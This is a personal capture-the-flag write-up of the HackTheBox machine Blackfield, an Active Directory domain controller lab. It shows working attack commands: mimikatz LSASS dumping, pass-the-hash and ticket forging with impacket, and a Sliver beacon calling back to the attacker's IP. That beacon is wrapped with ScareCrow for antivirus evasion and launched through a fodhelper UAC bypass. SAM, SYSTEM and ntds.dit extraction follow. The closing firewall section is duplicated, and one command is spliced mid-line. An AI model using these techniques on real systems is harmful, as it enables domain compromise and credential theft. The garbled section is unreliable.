# Blackfield Writeup

## Authors Warning with defining this.. 
I did everything up dumping SAM and SYSTEM hives then I failed for about 2 hours. Here are my arguments to calling this a Writeup, but I almost called a Helped-Thorough twice during the subsequent hour of deliberating and WTFisThis machine too.

- if Kerberos can sign a ticket with one hash, but you cannot login with kerberos with either ticket generated from each hash 
- Why should it be possible to backup ntds.dit to smb server that is not even domain joined, but not robocopy ntds.dit and security hive when you can copy with `reg`,`robocopy` and `copy` both SAM and System hives. 
- Use CAN use an ELEVEN year old C# .dll on a domain controller in 2019 to abuse the SeBackupPrivilege
- Normally SeBackupPrivilege and SeRestorePrivilege give you read/write permission ... 
-  I got all the way to the end without hints or writeup, but did not consider the weirdness expressed above.
- The way lots of people got root.txt with `cipher /c root.txt` before the patch

Git commit for this *writeup* - `Root Salt is Black and found on nondomjoin Field`


For the big sighs my notes contained:
![1080](haditinmynotestoo.png)


Name: Blackfield
Date:  13/1/2024
Difficulty:  Hard
Goals:  
- Four hours then Helped-Through, but it will probably be a Helped-Through
- General review of my AD methodology 
Learnt:
- Do not look at the HTB Machine Info tab for retired machines. 
- Sometimes I am correct 
- DOWNLOAD THE SYMBOL TABLES IDIOT 
- GitHub does not have a facepalm emoji, the one time I actually would like to use an emoji and join in
- Windows Sysadmin Backup and Restore
Beyond Root:
- Active-Directory-Recon improvements


- [[Blackfield-Notes.md]]
- [[Blackfield-CMD-by-CMDs.md]]


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Blackfield/Screenshots/ping.png)

![](cmebasic.png)
![](improvementsandconcise.png)
![](nodigdomaintransfer.png)
![](sadamass.png)
![](bigguestcmerid.png)
![](cmeshareguest.png)
![](cmeguestnopassword.png)
![](cmeendofguestridmoreusers.png)
![](smbmapguestrec1.png)
![](smbmapguestrec2-profiles.png.png)
![](rpcclientnullauth.png)
![](manldap1.png)
![](ldapsallobjs.png)
![](ldapsallobjs2.png)
![](ldapsallobjsmid.png)
![](ldapsearchwithnmap.png)
![](nobasicpasswordsfromcmespray.png)
![](getnpusers-support.png)
![](cracked-supportasrep23.png)
![](nosupportpassreuse.png)
![](supporthasmoresmbread.png)
![](suppport-bloodhoundPY.png)
![](dumpedtheentireldapdomain.png)
![](supportcanchangetheaudit2020password.png)
![](svcbackupcanpsremote.png)
![](theonlyremotinguser.png)
![](passwordpolicyfromsysvol.png)
![](hurrayforhacktrickontheforcechangepassword.png)
![](audit2020thoseforensicshares.png)
![](forensic-systeminfo.png)
![](domainusershasbeenpwned.png)
![](pwnedthedas.png)
![](getthelsass.png)
![](netstatpwnagereveal.png)
![](timeoutagainwithsmbmap.png)
![](lsassdumpwithcurl.png)
![](smbclientfailedtogetlsass.png)

After being jaded into the proving-ground-rabbithole-mindset-of-absolute-brick-through-a-window-when-the-allegorical-egg-timer-of-doom-goes-PING, I decided to reconsider the files and maybe the Ipwnyourcompany user is soft deleted, but would still appear in LDAP.  
![](ldapsearchingforIpwnyourcompany.png)


Microsoft Windows Server 2019 Standard ( 10.0.17763 N/A Build 17763 ) - WD / BL Evasion - Priv Esc Lateral Move
- https://gist.github.com/dualfade/48c45fb47ff273a3996c9a4f10ac9d72

Then the `wesng` call of nightmare text file of doom started given we can just pass it systeminfo.txt. After consider how I was going to deal with wesng in 2024. I thought that maybe if I check when the box was released maybe it would at least narrow down that potential rabbit holes.

Two things
![](htbupdatethatIspoiled.png)

1. It is basically a walkthrough of the machine
2. I was correct the direction of the machine I just thought I just did not have a way to get the lsass.zip
3. I noted the svc_backup in my notes so I am actually compelled to call this a walkthrough
4. Also the About Blackfield description is technical incorrect.

Well 
![1080](smbplaysveryveryverynice.png)

After some time crying about not being able to use volatility3 and then gazing into the python2 abyss  volatility2 for 5 minutes tried looking at the raw memory with `strings` and then had settle for the obvious fallback of:
![1080](wineandmimikatztotherescue.png)
[Dump passwords from lsass - iredteam](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz), with the twist of not worry about Windows making Windows Defender for Linux Free on Kali, Parrots, BlackArch, etc:
```bash
wine mimikatz/x64/mimikatz.exe
sekurlsa::minidump /tmp/lsass.DMP
sekurlsa::logonpasswords
```

Then marshal of the NTML hashes 
```bash
cat logonpasswords.mimikatz | grep NTLM | awk -F: '{print $2}' > dumpedntmls.ntml
```

Check Bloodhound for the SID of `svc_backup`
![](svcbackup-sid.png)

Found the SPN
![](findingsvcbacksidinthemimikatzoutput.png)

Uncrackable as per rockyou.txt
![](svcbackhashnotinrockyoudottext.png)

Impacket - being an idiot
```bash
impacket-getTGT -dc-ip 10.129.19.77 -hashes 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d BLACKFIELD.local/svc_backup
```
The issues with clock skewage. 

[After some time I remembered I already found all of the requirements to fix this for both VMware and Vbox](https://github.com/7RU7H/Archive/blob/main/Virtualization/Disable-Time-Synchronisation-With-Host-For-Guest-VMs.md). No GitHub facepalm emoji. Now it is just configuring the time.


![](netremotetoddoesnotwork.png)

![](ntpdate-issuespersist.png)

- wireshark kerberos 

Recon services to find the time of a remote server  
```bash
sudo nmap -Pn -sC -sV -p- --min-rate 500 10.129.19.77 -oN sc-sv-timegrabbing
sudo nmap -Pn -sU -p 123 --script ntp-info 10.129.19.77

# password required unless -U "" -N Zero Auth allowed, does mean guest account has privilege to query time  
rpcclient -U $username $ip netremotetod
```

![](thxSMBforthetime.png)

[faketime](https://manpages.ubuntu.com/manpages/trusty/man1/faketime.1.html)
```bash
faketime

# Usage: faketime [switches] <timestamp> <program with arguments>

# This will run the specified 'program' with the given 'arguments'. The program will be tricked into seeing the given 'timestamp' as its starting date and time. The clock will continue to run from this timestamp. Please see the manpage (man faketime) for advanced options, such as stopping the wall clock and make it run faster or slower.

The optional switches are:
  -m                  : Use the multi-threaded version of libfaketime
  -f                  : Use the advanced timestamp specification format (see manpage)
  --exclude-monotonic : Prevent monotonic clock from drifting (not the raw monotonic one)
  -p PID              : Pretend that the program\'s process ID is PID
  --date-prog PROG    : Use specified GNU-compatible implementation of 'date' program

# Advanced Timestamp format

# Freeze clock at absolute timestamp: "YYYY-MM-DD hh:mm:ss"
# Relative time offset: "[+/-]123[m/h/d/y]", e.g., "+60m", "+2y"
# Start-at timestamps: "@YYYY-MM-DD hh:mm:ss"

Examples:
faketime 'last friday 5 pm' /bin/date
faketime '2008-12-24 08:15:42' /bin/date
faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
faketime -f '+2,5y x0,50' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; done' # In this single case all spawned processes will use the same global clock without restarting it at the start of each process.

# (Please note that it depends on your locale settings whether . or , has to be used for fractions)
```

[faketime to set the time - HTB anubis spoilers be warned from 0xdf](https://0xdf.gitlab.io/2022/01/29/htb-anubis.html)

![](faketimeworkedallaroundNASAlevelcelebrations.png)

![](getuserspnsvcbackup.png)

Played around with `impacket` till I find my footholding
```bash
faketime -f '+8h' impacket-lookupsid -nthash 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d -domain-sid -target-ip 10.129.19.77 BLACKFIELD.local/svc_backup@DC01.BLACKFIELD.local | tee -a svc_backup_lookupsid.impacket
```

![](niceticketer.png)

```bash
faketime -f '+8h' impacket-ticketer -nthash 9658d1d1dcd9250115e2205d9f48400d -domain-sid S-1-5-21-4194615774-2175524697-3563712290 -domain BLACKFIELD.local svc_backup
```

Nevermind, I confused PSRemoting and PSExec.
![](confusionpsremotingwithpsexec.png)

I have done SeBackupPrivilege Before so I really wanted to try a UAC bypass as we have High Mandatory Level, but in Winrm
![](whoamisvcbackup.png)

![](pathofleastrestistecewithdc01.png)

![](nodcsyncaged.png)

![](snovvcrashtrickshotingtheandrw.png)

[UAC bypass trick from PPN - snovvcrash](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/uac-bypass)
```
Cmd > net use A: \\127.0.0.1\C$
Cmd > A:
Cmd > cd \Windows\System32
Cmd > echo test > test.txt
Cmd > dir test.txt
```

```bash
generate beacon --mtls  10.10.14.160:135 --arch amd64 --os windows --save /tmp/135-sliver.bin -f shellcode -G


mtls -L  10.10.14.160 -l 135

/opt/ScareCrow/ScareCrow -I /tmp/135-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Build with golang
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# Pack with upx
upx $file.exe

*Evil-WinRM* PS C:\programdata> upload OneDrive.exe
```


```powershell
$program = "powershell -windowstyle hidden C:\programdata\OneDrive.exe"
  
New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force


New-Item -Path "HKCU:\Software\Classes\ms-settings\FunDrive" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\FunDrive" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

![](sillypopcorns.png)

Performing intended path then
![](dotheintendedpath.png)

```go
execute -o cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
```

And we have the SAM and SYSTEM hives
![](samandsystemforblackfield.png)

If this would work for shell it would be nice, but does not.
```
67ef902eae0d740df6257f273de75051:67ef902eae0d740df6257f273de75051
```
![](adminhashinthesecretdump.png)

```bash
faketime -f '+8h' impacket-ticketer -nthash 67ef902eae0d740df6257f273de75051 -domain-sid S-1-5-21-4194615774-2175524697-3563712290 -domain BLACKFIELD.local Administrator
```

```bash
export KRB5CCNAME=Administrator.ccache

# Psexc in!
faketime -f '+8h' impacket-psexec -k -no-pass DC01.BLACKFIELD.local -dc-ip 10.129.19.77
```

Some whining later I resorted to `robocopy` 
![](grabbedthenotes.png)

![](recoverynothingfromthisdir.png)

![](verysadwmiexec.png)

Return double check knowing the Administrators is not in the Remote Desktop Users Group, but for writeup and deduction only.
![](doublechecking.png)

The power of collecting all the Hacking Information is always that you stumble back onto information that is very helpful - why not try the `attrib` command in KOTH/Battlegrounds platforms `attrib` is useful in hiding files from other players that do not know that feature exists  
![](becauseiwantcyberbloodonthebattelgroundofhtborkothoneday.png)
But SeBackup privileges
![](sadattrib.png)

RTFM for `robocopy /M` which failed

![](ntdsdit.png)
We can't dump NTDS.dit there is no:
![](thereisnosecurityhive.png)


![](bestpowershellspaniardformyblackfieldwrteupthx.png)

`7f1e4ff8c6a8e6b6fcae2d9c0572cd62`

![](whyadminwhy.png)

![](retickingadmin.png)

This seems weird, but I guess that something is weird about this machine for the final flag
![](weirdkerberos.png)

Maybe it is not my fault. But I saw someone as the Administrator so probably just need to use robocopy to backup the literal path not the reg command relative path.
![](hintintoaoh.png)

I still could not `robocopy` or `copy` the SECURITY hive.  

![](somethingiswrong.png)

![](hints2.png)

From reading the fourms this box was probably broken and then fixed.[0xdf](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs) wrote that you could just `cipher /c root.txt` from `svc_backup`. I decide to keep this a write up as if you had this access to the DC, both SECURITY and NTDS.dit would not have these weird permissions *if* I then could not restore them some how.
![](weshouldautomaticallyhavethesepermissions.png)

The good and bad news. I have rooted the box and this will remain a writeup . The bad news is box is broken 

I cant do this so this should not be possible
![](accessdenied.png)
And this contains a different hash
![](Ididthisitisthesamehaswhynowork.png)

`C:\programdata` I wrote SAM and SYSTEM hive to this directory...

- [Acl-FullControl.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1) - did not work
- [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) - its eleven years old
```powershell
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -
Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
c:\windows\temp\SYSTEM -Overwrite
```

```powershell
# Do not use impacket-smbserver as require NTFS/ReFS 

echo "Y" | wbadmin start backup -backuptarget:\\$IP\Share -include:c:\windows\ntds

wbadmin get versions

echo "Y" | wbadmin start recovery -version:$TIMEFROMVERSION -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```


Why should this work is using the Windows API to do the same with cat or `robocopy` `copy` do not work.
![](guilianocmdtocopy.png)
## Post-Root-Reflection  

- Yes the obvious answer is good, but sometimes the answer you did not know `vol` does not work have fun is the unfortunate state of the machine and the truth.
- I need a Forensics box with volatility working.
- I did it all by myself!
- I troubleshooted issues myself
- There are alot more ways to abuses SeBackup and SeRestore
- 
## Beyond Root


- https://www.thehacker.recipes/a-d/movement/credentials/dumping/passwords-in-memory

#### Firewall fun with netsh for legacy Windows and Powershell for modern Windows

Firewall fun has been sitting in my to do list for beyond root.

####  Netsh for Windows 7, Server 2008 (R2), Vista

[Netsh command is deprecated for - Windows 7, Server 2008 (R2), Vista](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10))
```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)

![](fwbr1.png)

![](uacrequriedforfwbr2.png)
#### Powershell Window 10 and Server 2016 onwards

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property 
DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalP#### Firewall fun with netsh for legacy Windows and Powershell for modern Windows

```

####  Netsh for Windows 7, Server 2008 (R2), Vista

[Netsh command is deprecated for - Windows 7, Server 2008 (R2), Vista](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10))

```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)

#### Powershell Window 10 and Server 2016 onwards

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property 
DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction, Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```

Enable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```
Disable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```


```powershell
Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow –NotifyOnListen True -AllowUnicastResponseToMulticast True –LogFileName %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
````ort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```

Enable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```
Disable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```


```powershell
Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow –NotifyOnListen True -AllowUnicastResponseToMulticast True –LogFileName %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
```
